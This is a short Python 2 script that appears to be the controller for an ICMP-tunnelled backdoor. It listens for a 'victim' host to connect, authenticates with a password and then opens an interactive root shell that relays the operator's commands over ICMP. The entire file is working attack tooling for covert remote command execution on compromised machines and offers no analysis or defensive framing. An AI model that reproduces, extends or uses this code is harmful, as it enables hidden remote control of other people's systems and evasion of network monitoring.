#!/usr/bin/env python
# encoding: utf-8

import os, sys, socket, struct, select, time, string, argparse
from icmpclient import Icmpclient
from const import *

def shell(client):
    cmd = ""
    try:

        while not "exit" in cmd:
            sys.stdout.write("root@" + client.dest + ": $ ")
            cmd = raw_input()
            client.send(cmd)
            resp = client.recv(5)
            if not "N0TH1NG" in resp:
                print resp

    except (EOFError, KeyboardInterrupt): #ctrl+D/C == exit

        cmd = "exit"
        client.send(cmd)
        print # clean screen

    sys.exit()

############## MAIN ###############
s = Icmpclient()
resp = "N0TH1NG"

print "Listening for incoming backdoor connections..."
while "N0TH1NG" in resp:
    resp = s.recv(10)
    if "N0TH1NG" in resp:
        print "INFO - timeout(10s) - The victim is likely offline"

s.send(PASSWORD)
resp = s.recv(10)
if resp == "Connected":
    print resp
    shell(s)
else: 
    print resp
